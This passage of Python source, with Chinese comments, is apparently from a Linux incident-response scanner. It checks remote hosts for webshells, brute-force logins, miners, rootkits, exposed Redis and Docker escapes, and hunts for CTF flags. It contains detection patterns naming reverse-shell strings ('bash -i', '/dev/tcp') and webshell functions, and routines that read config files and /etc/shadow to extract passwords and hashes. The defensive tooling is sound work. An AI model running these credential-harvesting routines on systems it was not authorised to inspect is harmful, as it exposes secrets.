                'sort | uniq -c | sort -rn | head -10; '
                'echo "-- 状态码 --"; awk \'{print $9}\' "%s" 2>/dev/null | '
                'sort | uniq -c | sort -rn; '
                'echo "-- POST 请求 --"; grep -c \'"POST\' "%s" 2>/dev/null; '
                'echo "-- 可疑请求 --"; grep -iE '
                "'union|select|eval|assert|shell|cmd|\\.\\./|/etc/passwd|"
                "webshell|antsword|whoami|id;|uname" '\' "%s" 2>/dev/null | tail -20; '
                'echo "-- 404 扫描 IP --"; awk \'$9==404{print $1}\' "%s" 2>/dev/null | '
                'sort | uniq -c | sort -rn | head -10' %
                (f, f, f, f, f, f)))
            self.results.setdefault(mk, {})[f] = info
            self._pr('分析: %s' % f, info, max_lines=80)
            if re.search(r'eval|assert|shell|antsword|union|/etc/passwd', info, re.I):
                self._find('HIGH', 'Web 攻击', '日志 %s 含攻击/Webshell 请求' % f, info[:300])

    # ============================================================
    # 模块 11: Webshell 检测
    # ============================================================
    def scan_webshell(self):
        mk = 'webshell'
        if not self.webroots:
            self._pr('Webshell', '(未检测到 Web 根目录, 跳过)')
            return
        for wr in self.webroots:
            self._pr('Webroot: %s' % wr, '')
            # PHP webshell
            php_sh = self.run(self.sudo(
                "grep -rIl -E '(eval\\(|assert\\(|system\\(|exec\\(|passthru\\(|"
                "shell_exec\\(|base64_decode\\(|gzinflate\\(|\\$_POST\\[|"
                "\\$_REQUEST\\[|preg_replace.*/e|create_function)' "
                '"%s" --include="*.php" 2>/dev/null | head -40' % wr))
            self.results.setdefault(mk + ':' + wr, {})['php_webshell'] = php_sh
            self._pr('PHP Webshell 候选', php_sh, max_lines=40)
            # JSP / ASP / Python
            self._do(mk, 'JSP Webshell',
                     "grep -rIl -E '(Runtime\\.getRuntime|ProcessBuilder)' "
                     '"%s" --include="*.jsp" 2>/dev/null | head -20' % wr)
            self._do(mk, 'ASP Webshell',
                     "grep -rIl -E '(eval|execute|Server\\.CreateObject)' "
                     '"%s" --include="*.asp" --include="*.aspx" 2>/dev/null | head -20' % wr)
            self._do(mk, 'Python Webshell',
                     "grep -rIl -E '(os\\.system|subprocess|commands\\.)' "
                     '"%s" --include="*.py" 2>/dev/null | head -20' % wr)
            # 异常扩展名
            self._do(mk, '异常 PHP 扩展名',
                     'find "%s" -type f \\( -name "*.phtml" -o -name "*.pht" '
                     '-o -name "*.php5" -o -name "*.phar" \\) 2>/dev/null | head -20' % wr)
            # 近期 PHP 文件
            self._do(mk, '近期 PHP 文件',
                     'find "%s" -name "*.php" -mtime -30 -type f 2>/dev/null | head -30' % wr)
            # 一句话检测
            oneliner = self.run(self.sudo(
                'grep -rIl "<?php @eval\\|<?php eval\\|@eval($_" "%s" 2>/dev/null | head -20' % wr))
            self.results.setdefault(mk + ':' + wr, {})['oneliner'] = oneliner
            self._pr('一句话木马检测', oneliner)

            if php_sh.strip() or oneliner.strip():
                self._find('HIGH', 'Webshell', '在 %s 发现 Webshell 文件' % wr,
                           (php_sh + oneliner)[:300])

    # ============================================================
    # 模块 12: 数据库与配置
    # ============================================================
    def scan_database(self):
        mk = 'database'
        # MySQL 配置
        self._do(mk, 'MySQL my.cnf', 'cat /etc/my.cnf /etc/mysql/my.cnf /etc/mysql/conf.d/*.cnf 2>/dev/null')
        # Web 应用配置 (含数据库凭据)
        cfg_files = ['config.php', 'database.php', 'config/database.php', '.env',
                     'wp-config.php', 'application.yml', 'application.properties',
                     'settings.py', 'config.yml', 'db.php', 'conn.php',
                     'config.inc.php', 'common.php']
        found_cfg = []
        if self.webroots:
            for wr in self.webroots:
                for cf in cfg_files:
                    fname = os.path.basename(cf)
                    res = self.run(self.sudo(
                        'find "%s" -name "%s" -type f 2>/dev/null | head -10' % (wr, fname)))
                    for line in res.splitlines():
                        if line.strip():
                            found_cfg.append(line.strip())
        found_cfg = list(dict.fromkeys(found_cfg))[:20]
        self.results.setdefault(mk, {})['config_files'] = '\n'.join(found_cfg)
        self._pr('配置文件', '\n'.join(found_cfg))
        # 读取凭据
        creds = []
        for cf in found_cfg:
            content = self.run(self.sudo('cat "%s" 2>/dev/null' % cf))
            self.results.setdefault(mk, {})[cf] = content
            self._pr('配置: %s' % cf, content, max_lines=40)
            for m in re.finditer(
                    r'(DB_|MYSQL_|DATABASE_|PASSWORD|PASSWD|PWD|SECRET|'
                    r'db_password|password)\s*[=:]\s*[\'"]?([^\'"\s;,]+)', content, re.I):
                creds.append('%s = %s @ %s' % (m.group(1), m.group(2), cf))
        if creds:
            self._find('MEDIUM', '凭据泄露', '配置文件中发现数据库凭据',
                       ' | '.join(creds)[:300])
        # Redis 配置
        redis_conf = self.run(self.sudo(
            'cat /etc/redis.conf /etc/redis/redis.conf 2>/dev/null'))
        self.results.setdefault(mk, {})['redis_conf'] = redis_conf
        self._pr('Redis 配置', redis_conf, max_lines=60)
        if redis_conf.strip():
            bind0 = bool(re.search(r'^bind\s+0\.0\.0\.0', redis_conf, re.M))
            prot_no = bool(re.search(r'^protected-mode\s+no', redis_conf, re.M))
            no_pass = not re.search(r'^requirepass\s+\S+', redis_conf, re.M)
            if bind0 and no_pass:
                self._find('HIGH', 'Redis', 'Redis bind 0.0.0.0 且无密码(未授权)',
                           redis_conf[:300])
            if prot_no and no_pass:
                self._find('HIGH', 'Redis', 'Redis protected-mode=no 且无密码',
                           redis_conf[:300])
        # nginx / apache 配置
        self._do(mk, 'nginx.conf',
                 'cat /etc/nginx/nginx.conf /usr/local/nginx/conf/nginx.conf 2>/dev/null', lines=60)
        self._do(mk, 'apache 配置',
                 'cat /etc/httpd/conf/httpd.conf /etc/apache2/apache2.conf 2>/dev/null', lines=60)

    # ============================================================
    # 模块 13: SSH 安全
    # ============================================================
    def scan_ssh_security(self):
        mk = 'ssh_security'
        sshd = self.run(self.sudo('grep -vE "^#|^$" /etc/ssh/sshd_config 2>/dev/null'))
        self.results.setdefault(mk, {})['sshd_config'] = sshd
        self._pr('sshd_config (有效行)', sshd, max_lines=50)

        if re.search(r'^PermitRootLogin\s+yes', sshd, re.M):
            self._find('MEDIUM', 'SSH', 'PermitRootLogin yes', sshd[:200])
        if re.search(r'^PermitEmptyPasswords\s+yes', sshd, re.M):
            self._find('HIGH', 'SSH', 'PermitEmptyPasswords yes', sshd[:200])
        if not re.search(r'^MaxAuthTries', sshd, re.M):
            self._find('LOW', 'SSH', '未设置 MaxAuthTries', sshd[:200])

        # auth 日志
        auth = self.run(self.sudo(
            "grep -E 'Accepted|Failed|invalid|Disconnect' "
            "/var/log/secure /var/log/auth.log 2>/dev/null | tail -60"))
        self.results.setdefault(mk, {})['auth_log'] = auth
        self._pr('认证日志', auth, max_lines=60)

        # 失败登录 IP 统计
        failed_ip = self.run(self.sudo(
            "grep -i 'Failed password\\|authentication failure' "
            "/var/log/secure /var/log/auth.log 2>/dev/null | "
            "grep -oE 'from [0-9.]+' | awk '{print $2}' | "
            "sort | uniq -c | sort -rn | head -15"))
        self.results.setdefault(mk, {})['failed_ip_stats'] = failed_ip
        self._pr('失败登录 IP 统计', failed_ip)

        for line in failed_ip.splitlines():
            m = re.match(r'\s*(\d+)\s+([0-9.]+)', line)
            if m:
                cnt = int(m.group(1))
                if cnt > 50:
                    self._find('HIGH', '暴力破解',
                               'IP %s 失败登录 %d 次(暴力破解)' % (m.group(2), cnt),
                               line)
                elif cnt > 10:
                    self._find('MEDIUM', '暴力破解',
                               'IP %s 失败登录 %d 次' % (m.group(2), cnt), line)

        # 成功外部登录
        ext_login = self.run(self.sudo(
            "grep 'Accepted' /var/log/secure /var/log/auth.log 2>/dev/null | "
            "grep -vE '127.0.0.1|localhost' | tail -20"))
        self.results.setdefault(mk, {})['external_logins'] = ext_login
        self._pr('外部成功登录', ext_login)
        if ext_login.strip():
            self._find('INFO', 'SSH 登录', '存在外部 IP 成功登录', ext_login[:300])

        self._do(mk, 'SSH Host Keys', 'ls -la /etc/ssh/ 2>/dev/null | grep -iE "key"')

    # ============================================================
    # 模块 14: 流量包分析
    # ============================================================
    def scan_pcap(self):
        mk = 'pcap'
        pcap_files = self.run(self.sudo(
            'find / -type f \\( -name "*.pcap" -o -name "*.pcapng" -o -name "*.cap" \\) '
            '2>/dev/null | grep -vE "^/proc|^/sys" | head -20'))
        self.results.setdefault(mk, {})['pcap_files'] = pcap_files
        self._pr('Pcap 文件', pcap_files)

        for f in [l.strip() for l in pcap_files.splitlines() if l.strip()][:10]:
            self._pr('Pcap: %s' % f, self.run(self.sudo('ls -lh "%s" 2>/dev/null' % f)))
            info = self.run(self.sudo(
                'echo "-- flag --"; strings "%s" 2>/dev/null | grep -iE "flag\\{|ctf\\{" | head -10; '
                'echo "-- Webshell特征 --"; strings "%s" 2>/dev/null | grep -iE '
                "'asenc|asoutput|antsystem|Z0|base64_decode|eval|ini_set|open_basedir|"
                "assert|whoami|net user" '\' | head -20; '
                'echo "-- HTTP请求 --"; strings "%s" 2>/dev/null | grep -iE '
                "'(GET|POST) /|Host: ' | head -20; "
                'echo "-- POST参数名 --"; strings "%s" 2>/dev/null | grep -iE '
                "'POST /.*=|&\\w+=' | head -20; "
                'echo "-- 域名 --"; strings "%s" 2>/dev/null | grep -iE '
                "'^([a-z0-9-]+\\.)+[a-z]{2,}$' | sort -u | head -20" %
                (f, f, f, f, f)))
            self.results.setdefault(mk, {})[f] = info
            self._pr('分析: %s' % f, info, max_lines=80)
            if re.search(r'flag\{|ctf\{', info, re.I):
                self._find('HIGH', 'Flag', 'Pcap %s 中发现 flag' % f, info[:300])
            if re.search(r'asenc|asoutput|antsystem|base64_decode|eval\(|assert', info, re.I):
                self._find('HIGH', 'Webshell', 'Pcap %s 中发现 Webshell 流量特征' % f,
                           info[:300])

    # ============================================================
    # 模块 15: 恶意软件检测
    # ============================================================
    def scan_malware(self):
        mk = 'malware'
        # 可疑 ELF
        susp_elf = self.run(self.sudo(
            'find /tmp /dev/shm /root /home /var/tmp -type f -exec file {} \\; 2>/dev/null '
            '| grep -i "ELF\\|executable"'))
        self.results.setdefault(mk, {})['suspicious_elf'] = susp_elf
        self._pr('可疑 ELF 文件', susp_elf, max_lines=40)
        # Go 编译 ELF (排除 [error] 响应)
        go_elf = self.run(self.sudo(
            'find / -type f -exec file {} \\; 2>/dev/null | grep -i "Go BuildID" | head -20'))
        if go_elf.startswith('[error]'):
            go_elf = ''
        self.results.setdefault(mk, {})['go_elf'] = go_elf
        self._pr('Go 编译 ELF', go_elf, max_lines=20)
        for line in go_elf.splitlines():
            if ':' in line:
                path = line.split(':', 1)[0].strip()
                if path:
                    strs = self.run(self.sudo(
                        'strings "%s" 2>/dev/null | grep -iE '
                        "'stratum|pool|wallet|xmrig|/bin/sh|connect|reverse|"
                        "bash -i|/dev/tcp' | head -15" % path))
                    if strs.strip():
                        self.results.setdefault(mk, {})['go_' + path] = strs
                        self._pr('Go ELF strings: %s' % path, strs)
        # 挖矿配置 (排除系统配置文件误报: grub/lvm/ntp/logrotate 等)
        mining_cfg = self.run(self.sudo(
            r"grep -rl -E 'stratum\+tcp|stratum\+ssl|xmr\.|xmrig|cryptonight|pool\.minexmr|wallet\s*:' "
            "/etc /tmp /root /home /opt /var 2>/dev/null "
            "| grep -vE '^/var/log|^/proc|^/sys|^/etc/grub|^/etc/lvm|^/etc/ntp|"
            "^/etc/logrotate|^/etc/udev|^/etc/csh|^/etc/passwd|^/etc/services|"
            "^/etc/statetab|^/etc/rc.d|^/etc/profile$|^/var/cache|^/var/lib|^/etc/yum' | head -20"))
        self.results.setdefault(mk, {})['mining_config'] = mining_cfg
        self._pr('挖矿配置文件', mining_cfg)
        # 后门文件名
        backdoors = self.run(self.sudo(
            'find / -type f \\( -name "*.sh" -o -name "*.py" -o -name "*.pl" \\) '
            '2>/dev/null | grep -vE "^/usr/|^/proc|^/sys" | head -30'))
        self.results.setdefault(mk, {})['backdoor_candidates'] = backdoors
        self._pr('后门候选脚本', backdoors, max_lines=30)
        # 常见 webshell 文件名
        ws_names = self.run(self.sudo(
            'find / -type f \\( -iname "shell*" -o -iname "cmd*" -o -iname "c99*" '
            '-o -iname "r57*" -o -iname "b374k*" -o -iname "wso*" \\) '
            '2>/dev/null | grep -vE "^/proc|^/sys|^/usr/share" | head -20'))
        self.results.setdefault(mk, {})['webshell_names'] = ws_names
        self._pr('常见 Webshell 文件名', ws_names, max_lines=20)
        # LD_PRELOAD
        ldpre = self.run(self.sudo(
            'env | grep -i LD_PRELOAD; cat /etc/ld.so.preload 2>/dev/null'))
        self.results.setdefault(mk, {})['ld_preload'] = ldpre
        self._pr('LD_PRELOAD 检测', ldpre)

        if go_elf.strip():
            self._find('HIGH', '恶意软件', '发现 Go 编译的 ELF 文件(常见后门/挖矿)',
                       go_elf[:300])
        if mining_cfg.strip():
            self._find('HIGH', '挖矿', '发现挖矿配置文件', mining_cfg[:300])
        if re.search(r'\S', ldpre):
            self._find('HIGH', 'Rootkit', 'LD_PRELOAD 被设置', ldpre[:200])
        if susp_elf.strip():
            self._find('MEDIUM', '恶意软件', '临时/用户目录存在可执行 ELF', susp_elf[:300])

    # ============================================================
    # 模块 16: Rootkit 检测
    # ============================================================
    def scan_rootkit(self):
        mk = 'rootkit'
        self._do(mk, 'ld.so.preload', 'cat /etc/ld.so.preload 2>/dev/null')
        # 隐藏进程对比
        ps_pids = self.run(self.sudo("ps -e -o pid= 2>/dev/null | tr -d ' ' | sort -n"))
        proc_pids = self.run(self.sudo(
            "ls -d /proc/[0-9]* 2>/dev/null | sed 's#/proc/##' | sort -n"))
        self.results.setdefault(mk, {})['ps_pids'] = ps_pids
        self.results.setdefault(mk, {})['proc_pids'] = proc_pids
        ps_set = set(ps_pids.split())
        proc_set = set(proc_pids.split())
        hidden = []
        for pid in sorted(proc_set, key=lambda x: int(x) if x.isdigit() else 0):
            if pid not in ps_set:
                hidden.append(pid)
        # 排除短命子进程: 只报告在 /proc 中实际存在且能读到 comm 的 PID
        real_hidden = []
        for pid in hidden:
            comm = self.run(self.sudo('cat /proc/%s/comm 2>/dev/null' % pid))
            if comm.strip():
                real_hidden.append('%s (%s)' % (pid, comm.strip()))
        hidden_str = '\n'.join(real_hidden)
        self.results.setdefault(mk, {})['hidden_pids'] = hidden_str
        self._pr('隐藏进程 (proc - ps)', hidden_str)
        # 系统命令完整性
        cmds_list = ['ps', 'ls', 'netstat', 'ss', 'find', 'grep', 'cat', 'top', 'lsof']
        self._do(mk, '系统命令 stat',
                 'stat ' + ' '.join('$(which %s 2>/dev/null)' % c for c in cmds_list) + ' 2>/dev/null',
                 lines=40)
        self._do(mk, 'rkhunter', 'rkhunter --check --sk --report-warnings-only 2>/dev/null | head -30')
        self._do(mk, 'chkrootkit', 'chkrootkit 2>/dev/null | grep -i infected | head -20')
        # 可疑内核模块
        susp_mods = self.run(self.sudo(
            'lsmod 2>/dev/null | grep -ivE "^Module|nfs|ext|xfs|jfs|fat|vfat|iso9660|'
            'loop|sd|sr|ata|ahci|libahci|scsi|usb|hid|evdev|input|i8042|serio|'
            'acpi|battery|fan|thermal|processor|cpufreq|mperf|coretemp|kvm|'
            'irqbypass|virtio|drm|i2c|snd|soundcore|ppdev|parport|lp|cryptd|'
            'aes|crc|sha|md5|ghash|crc32|joydev|autofs4"'))
        self.results.setdefault(mk, {})['suspicious_modules'] = susp_mods
        self._pr('可疑内核模块', susp_mods)

        preload = self.results.get(mk, {}).get('ld.so.preload', '')
        if preload.strip():
            self._find('HIGH', 'Rootkit', 'ld.so.preload 非空', preload[:200])
        if real_hidden:
            self._find('HIGH', 'Rootkit', '发现 %d 个隐藏进程(DKRPI)' % len(real_hidden),
                       hidden_str[:300])
        if susp_mods.strip():
            self._find('MEDIUM', 'Rootkit', '发现可疑内核模块', susp_mods[:300])

    # ============================================================
    # 模块 17: Docker 容器
    # ============================================================
    def scan_docker(self):
        mk = 'docker'
        self._do(mk, 'docker ps -a', 'command -v docker >/dev/null 2>&1 && docker ps -a 2>/dev/null || echo "docker 未安装"')
        self._do(mk, 'docker images', 'command -v docker >/dev/null 2>&1 && docker images 2>/dev/null')
        self._do(mk, 'docker info', 'command -v docker >/dev/null 2>&1 && docker info 2>/dev/null | head -30')
        # 容器内能力
        caps = self.run(self.sudo('cat /proc/1/status 2>/dev/null | grep Cap'))
        self.results.setdefault(mk, {})['capabilities'] = caps
        self._pr('容器能力 (CapEff)', caps)
        # docker.sock
        sock = self.run(self.sudo('ls -la /var/run/docker.sock 2>/dev/null'))
        self.results.setdefault(mk, {})['docker_sock'] = sock
        self._pr('docker.sock', sock)

        cap_str = caps
        # 先判断是否在容器中 (非容器=物理机/VM, root 拥有全部 capability 是正常的)
        cgroup1 = self.run(self.sudo('cat /proc/1/cgroup 2>/dev/null'))
        is_container_env = bool(re.search(r'docker|lxc|kubepods', cgroup1))
        # CAP_SYS_ADMIN = bit 21 (0x200000)
        if cap_str and is_container_env:
            m = re.search(r'CapEff:\s*([0-9a-fA-F]+)', cap_str)
            if m:
                try:
                    val = int(m.group(1), 16)
                    if val & 0x200000:
                        self._find('HIGH', '容器逃逸',
                                   '容器拥有 CAP_SYS_ADMIN (特权容器, 逃逸风险高)',
                                   cap_str[:200])
                except ValueError:
                    pass
        if sock.strip():
            self._find('INFO', 'Docker', 'docker.sock 存在', sock[:150])

    # ============================================================
    # 智能异常分析 (基线对比)
    # ============================================================
    def analyze_anomalies(self):
        """后置智能异常分析: 对比内置基线, 自动发现异常"""
        self._sec(99, '智能异常分析 (基线对比)')
        print(C.cyan('  [>] 对所有采集数据与内置正常基线进行对比分析...\n'))

        # ===== 1. 用户与权限分析 =====
        print(C.bold('  > 用户与权限分析'))
        passwd = self.results.get('users', {}).get('/etc/passwd', '')
        shadow = self.results.get('users', {}).get('shadow', '')

        SERVICE_USERS = {
            'www-data', 'nginx', 'apache', 'httpd', 'mysql', 'mariadb',
            'redis', 'mongodb', 'postgres', 'nobody', 'mail', 'ftp',
            'daemon', 'bin', 'sys', 'sync', 'games', 'man', 'lp',
            'news', 'uucp', 'proxy', 'list', 'irc', 'gnats',
            'systemd-timesync', 'systemd-network', 'systemd-resolve',
            'systemd-coredump', 'dbus', 'polkitd', 'tss', 'sshd',
            'tcpdump', 'usbmux', '_apt', 'landscape', 'syslog',
            'uuidd', 'dnsmasq', 'saned', 'colord', 'geoip',
            'Debian-exim', 'statd', 'rpc', 'rpcuser', 'nfsnobody',
            'halt', 'shutdown', 'operator', 'postfix', 'ntp', 'chrony',
        }
        LOGIN_SHELLS = {'/bin/bash', '/bin/sh', '/bin/dash', '/bin/zsh',
                        '/bin/ksh', '/bin/tcsh', '/bin/csh', '/usr/bin/bash',
                        '/usr/bin/sh', '/usr/bin/zsh', '/usr/bin/fish'}

        service_with_shell = []
        for line in passwd.splitlines():
            parts = line.split(':')
            if len(parts) < 7:
                continue
            username, uid, shell = parts[0], parts[2], parts[6]
            if username in SERVICE_USERS and shell in LOGIN_SHELLS:
                service_with_shell.append(
                    '%s (UID=%s, shell=%s)' % (username, uid, shell))

        if service_with_shell:
            self._find('MEDIUM', '账户异常',
                       '服务账户拥有登录 shell (可能被攻击者修改)',
                       '\n'.join(service_with_shell))
        else:
            print(C.green('    [+] 服务账户 shell 正常'))

        # 密码哈希分析
        weak_hashes = []
        for line in shadow.splitlines():
            parts = line.split(':')
            if len(parts) < 2:
                continue
            username, hashval = parts[0], parts[1]
            if hashval == '':
                weak_hashes.append('%s: 空密码' % username)
            elif hashval in ('!', '*') or hashval.startswith('!'):
                pass
            elif hashval == 'x':
                pass
            elif not hashval.startswith('$'):
                weak_hashes.append('%s: 非$格式 (DES/弱哈希)' % username)
            elif hashval.startswith('$1$'):
                weak_hashes.append('%s: MD5 哈希 (弱)' % username)
            elif hashval.startswith('$5$'):
                weak_hashes.append('%s: SHA-256 (可接受但建议升级)' % username)

        if weak_hashes:
            self._find('HIGH', '密码安全',
                       '发现弱密码哈希或空密码账户',
                       '\n'.join(weak_hashes))
        else:
            print(C.green('    [+] 密码哈希算法正常'))

        # 特权组成员检查
        priv_groups = self.results.get('users', {}).get('特权组', '')
        for line in priv_groups.splitlines():
            if 'wheel' not in line and 'sudo' not in line and 'admin' not in line:
                continue
            parts = line.split(':')
            if len(parts) < 4:
                continue
            members = parts[-1].split(',')
            for m in members:
                m = m.strip()
                if m and m not in SERVICE_USERS and m != 'root':
                    self._find('MEDIUM', '权限提升',
                               '用户 %s 在特权组中' % m, line.strip())

        # ===== 2. 网络端口基线分析 =====
        print(C.bold('\n  > 网络端口分析'))
        listen = self.results.get('network', {}).get('监听端口', '')
        SAFE_PORTS = {
            '22': 'SSH', '80': 'HTTP', '443': 'HTTPS',
            '25': 'SMTP', '465': 'SMTPS', '587': 'SUBMISSION',
            '21': 'FTP', '53': 'DNS', '873': 'rsync',
            '111': 'rpcbind', '2049': 'NFS',
        }
        DB_PORTS = {
            '3306': 'MySQL', '5432': 'PostgreSQL',
            '6379': 'Redis', '27017': 'MongoDB',
            '9200': 'Elasticsearch', '11211': 'Memcached',
            '9042': 'Cassandra', '5984': 'CouchDB',
        }

        known_ports = set()
        unknown_ports = set()
        db_exposed = []

        for line in listen.splitlines():
            if 'LISTEN' not in line and 'UNCONN' not in line:
                continue
            m = re.search(r'[:.](\d+)\s+', line)
            if not m:
                continue
            port = m.group(1)

            if port in DB_PORTS:
                if re.search(r'\b0\.0\.0\.0\b|\*:' + port +
                             r'|\[::\]:' + port + r'|:::' + port, line):
                    db_exposed.append('%s (%s) 对外监听' % (port, DB_PORTS[port]))
                else:
                    known_ports.add('%s (%s, 本地)' % (port, DB_PORTS[port]))
            elif port in SAFE_PORTS:
                known_ports.add('%s (%s)' % (port, SAFE_PORTS[port]))
            elif port in ('9000', '8888', '888', '3000', '33060') and \
                    re.search(r'127\.0\.0\.1|::1', line):
                known_ports.add('%s (本地服务)' % port)
            else:
                unknown_ports.add('%s -> %s' % (port, line.strip()))

        if known_ports:
            print(C.green('    [+] 已知服务端口: ' + ', '.join(sorted(known_ports))))
        if db_exposed:
            for d in db_exposed:
                self._find('HIGH', '端口暴露',
                           '数据库/缓存对外监听: %s' % d, d)
        if unknown_ports:
            self._find('MEDIUM', '端口异常',
                       '发现非标准端口 (%d 个), 需人工确认' % len(unknown_ports),
                       '\n'.join(list(unknown_ports)[:10]))
        elif not db_exposed:
            print(C.green('    [+] 未发现异常端口'))

        # ===== 3. /etc/hosts DNS 劫持检测 =====
        print(C.bold('\n  > /etc/hosts 分析'))
        hosts = self.results.get('network', {}).get('/etc/hosts', '')
        COMMON_DOMAINS = re.compile(
            r'(github\.com|google\.com|baidu\.com|aliyun\.com|'
            r'cloud\.tencent|docker\.com|npmjs\.org|pypi\.org|'
            r'githubusercontent|raw\.github)', re.I)
        hijack_entries = []
        for line in hosts.splitlines():
            line = line.strip()
            if not line or line.startswith('#'):
                continue
            if COMMON_DOMAINS.search(line):
                hijack_entries.append(line)

        if hijack_entries:
            self._find('HIGH', 'DNS 劫持',
                       '/etc/hosts 中发现域名劫持条目',
                       '\n'.join(hijack_entries))
        else:
            print(C.green('    [+] /etc/hosts 无域名劫持'))

        # ===== 4. SSH 配置基线分析 =====
        print(C.bold('\n  > SSH 配置分析'))
        sshd = self.results.get('ssh_security', {}).get('sshd_config', '')
        ssh_issues = []
        if sshd:
            if re.search(r'^PasswordAuthentication\s+yes', sshd, re.M):
                ssh_issues.append('PasswordAuthentication yes (密码登录已开启)')
            m = re.search(r'^PermitRootLogin\s+(\S+)', sshd, re.M)
            if m and m.group(1) not in ('no',):
                ssh_issues.append('PermitRootLogin %s (root 登录未禁用)' % m.group(1))
            if re.search(r'^X11Forwarding\s+yes', sshd, re.M):
                ssh_issues.append('X11Forwarding yes')
            if not re.search(r'^MaxAuthTries', sshd, re.M):
                ssh_issues.append('未设置 MaxAuthTries (默认6)')

        if ssh_issues:
            self._find('MEDIUM', 'SSH 配置',
                       'SSH 安全配置存在弱项', '\n'.join(ssh_issues))
        elif sshd:
            print(C.green('    [+] SSH 配置基线正常'))
        else:
            print('    [-] SSH 配置数据缺失')

        # ===== 5. 攻击链推断 =====
        print(C.bold('\n  > 攻击链推断'))
        cats = set(f['category'] for f in self.findings)
        attack_steps = []
        if '暴力破解' in cats:
            attack_steps.append('暴力破解')
        if 'Web 攻击' in cats or 'Webshell' in cats:
            attack_steps.append('Web 渗透/Webshell')
        if '后门账户' in cats or '反弹Shell' in cats or '恶意进程' in cats:
            attack_steps.append('后门植入')
        if '计划任务' in cats or '持久化' in cats:
            attack_steps.append('持久化')
        if '挖矿' in cats:
            attack_steps.append('挖矿伪装')
        if 'SUID 提权' in cats:
            attack_steps.append('SUID 提权')
        if 'Rootkit' in cats:
            attack_steps.append('Rootkit 隐藏')

        if len(attack_steps) >= 2:
            chain_str = ' -> '.join(attack_steps)
            self._find('HIGH', '攻击链',
                       '推断完整攻击链: %s' % chain_str,
                       '基于 %d 个关联发现' % len(attack_steps))
            print(C.yellow('    [?] 推断攻击链: ' + chain_str))
        elif len(attack_steps) == 1:
            print(C.cyan('    [*] 部分攻击迹象: ' + attack_steps[0]))
        else:
            print(C.green('    [+] 未发现明显攻击链'))

        print()

    # ============================================================
    # 模块 18: 综合报告
    # ============================================================
    def generate_report(self):
        counts = {'HIGH': 0, 'MEDIUM': 0, 'LOW': 0, 'INFO': 0}
        for f in self.findings:
            counts[f['severity']] = counts.get(f['severity'], 0) + 1
        score = min(100, counts['HIGH'] * 15 + counts['MEDIUM'] * 8 + counts['LOW'] * 3)
        if score >= 70:
            level = '严重'
        elif score >= 40:
            level = '高危'
        elif score >= 20:
            level = '中危'
        elif score > 0:
            level = '低危'
        else:
            level = '正常'

        self.results['__meta__'] = {
            'target': '%s:%s' % (self.host, self.port),
            'user': self.user,
            'scan_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'duration_sec': round(self.scan_duration, 1),
            'is_root': bool(self._is_root_user),
            'webroots': self.webroots,
            'risk_score': score,
            'risk_level': level,
            'severity_counts': counts,
            'total_findings': len(self.findings),
        }

        box_w = 62
        print("\n" + "+" + "-" * box_w + "+")
        title = "  Linux 应急响应扫描报告"
        print("|" + C.bold(title.center(box_w)) + "|")
        print("+" + "-" * box_w + "+")
        info_lines = [
            ("目标主机", "%s:%s" % (self.host, self.port)),
            ("登录用户", self.user),
            ("扫描时间", datetime.now().strftime('%Y-%m-%d %H:%M:%S')),
            ("扫描耗时", "%.1f 秒" % self.scan_duration),
            ("风险评分", "%d / 100" % score),
            ("风险等级", level),
            ("发现统计", "HIGH=%d  MEDIUM=%d  LOW=%d  INFO=%d" % (
                counts['HIGH'], counts['MEDIUM'], counts['LOW'], counts['INFO'])),
        ]
        for label, val in info_lines:
            line = ("  %-8s %s" % (label, val))
            print("|" + line.ljust(box_w) + "|")
        print("+" + "-" * box_w + "+\n")

        if counts['HIGH'] > 0:
            print(C.red(C.bold("  [高危发现]")))
            for f in self.findings:
                if f['severity'] != 'HIGH':
                    continue
                print("    " + C.red("[!] ") + f['description'])
                if f['evidence']:
                    print("        " + f['evidence'][:200])
            print()

        if counts['MEDIUM'] > 0:
            print(C.yellow(C.bold("  [中危发现]")))
            for f in self.findings:
                if f['severity'] != 'MEDIUM':
                    continue
                print("    " + C.yellow("[?] ") + f['description'])
                if f['evidence']:
                    print("        " + f['evidence'][:200])
            print()

        print(C.green("  [*] 扫描完成, 共 %d 个发现, 风险评分 %d (%s)" % (
            len(self.findings), score, level)))

        # Flag 汇总
        flag_hits = self._flag_hunt()
        if flag_hits:
            print()
            print(C.bold(C.cyan("  [Flag 汇总]")))
            print(C.cyan("  以下是在各模块扫描结果中发现的 flag 模式,"
                         "可往上翻看对应模块了解上下文:"))
            print()
            for item in flag_hits:
                src = C.yellow("[%s > %s]" % (item['module'], item['key']))
                print("    " + C.green(item['flag']) + "  " + src)
                if item['line']:
                    print("        " + C.cyan(item['line'][:200]))
            print()
            print(C.green("  [*] 共发现 %d 个 flag 命中" % len(flag_hits)))
        else:
            print()
            print(C.yellow("  [*] 未在扫描结果中发现 flag 模式"))

    # ============================================================
    # Flag 搜索引擎
    # ============================================================
    def _flag_hunt(self):
        """从所有模块结果中提取 flag 模式, 标注来源模块和 key"""
        FLAG_PATTERNS = [
            re.compile(r'(?:flag|ctf|FLAG|CTF|key|KEY)\{[^}]+\}', re.IGNORECASE),
            re.compile(r'(?:DASCTF|dasctf)\{[^}]+\}'),
            re.compile(r'CTF2?\{[^}]+\}', re.IGNORECASE),
            re.compile(r'(?:flag|ctf)\[[^\]]+\]', re.IGNORECASE),
        ]
        # 模块 key 到模块名称的映射
        key_to_module = {}
        for num in range(1, 18):
            if num not in MODULES:
                continue
            method_name, title = MODULES[num]
            # 模块在 results 中使用的 key 前缀
            key_prefix = method_name.replace('scan_', '')
            key_to_module[key_prefix] = title

        hits = []
        seen = set()
        for mod_key, mod_data in self.results.items():
            if mod_key == '__meta__' or mod_key == 'errors':
                continue
            # 确定模块显示名
            mod_name = mod_key
            for kp, mn in key_to_module.items():
                if mod_key == kp or mod_key.startswith(kp):
                    mod_name = mn
                    break

            # 遍历该模块的所有结果值
            texts = []
            if isinstance(mod_data, dict):
                for sub_key, sub_val in mod_data.items():
                    texts.append((sub_key, str(sub_val) if sub_val else ''))
            elif isinstance(mod_data, (str, list)):
                texts.append((mod_key, str(mod_data)))

            for sub_key, text in texts:
                if not text or len(text) < 4:
                    continue
                for pat in FLAG_PATTERNS:
                    for m in pat.finditer(text):
                        flag_str = m.group(0)
                        if flag_str in seen:
                            continue
                        seen.add(flag_str)
                        # 提取所在行
                        pos = m.start()
                        line_start = text.rfind('\n', 0, pos)
                        line_start = line_start + 1 if line_start != -1 else 0
                        line_end = text.find('\n', pos)
                        line_end = line_end if line_end != -1 else len(text)
                        line_text = text[line_start:line_end].strip()[:300]
